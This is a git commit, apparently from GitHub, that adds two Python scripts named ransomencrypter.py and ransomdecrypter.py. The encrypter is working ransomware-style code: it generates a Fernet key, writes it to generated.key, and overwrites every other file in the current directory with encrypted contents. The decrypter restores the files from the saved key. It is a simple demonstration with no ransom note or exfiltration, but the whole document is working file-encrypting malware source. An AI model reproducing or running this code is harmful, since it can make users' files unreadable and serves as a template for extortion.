1f4c4ccd8b96afeb5a6f74b65c26d3637d425cda
İsmail Arda Güler <95390026+iardaguler@users.noreply.github.com>
2024-02-04 17:30:45 +0300

    Add files via upload

---
+++ ransomdecrypter.py
@@ -0,0 +1,27 @@
+import os
+from cryptography.fernet import Fernet
+
+file_list = []
+
+for file in os.listdir():
+
+    if file == "ransomencrypter.py" or file == "generated.key" or file == "ransomdecrypter.py":
+        continue
+
+    if os.path.isfile(file):
+        file_list.append(file)
+
+
+with open("generated.key","rb") as generatedkey:
+    secret_key = generatedkey.read()
+
+for file in file_list:
+
+    with open(file,"rb") as the_file:
+        contents = the_file.read()
+
+    contents_decrypted = Fernet(secret_key).decrypt(contents)
+
+    with open(file,"wb") as the_file:
+        the_file.write(contents_decrypted)
+
---
+++ ransomencrypter.py
@@ -0,0 +1,30 @@
+import os
+from cryptography.fernet import Fernet
+
+file_list = []
+
+for file in os.listdir():
+
+    if file == "ransomencrypter.py" or file == "generated.key" or file == "ransomdecrypter.py":
+        continue
+
+    if os.path.isfile(file):
+        file_list.append(file)
+
+print(file_list)
+
+key = Fernet.generate_key()
+
+with open("generated.key", "wb") as generatedkey:
+    generatedkey.write(key)
+
+for file in file_list:
+
+    with open(file,"rb") as the_file:
+        contents = the_file.read()
+
+    contents_encrypted = Fernet(key).encrypt(contents)
+
+    with open(file,"wb") as the_file:
+        the_file.write(contents_encrypted)
+
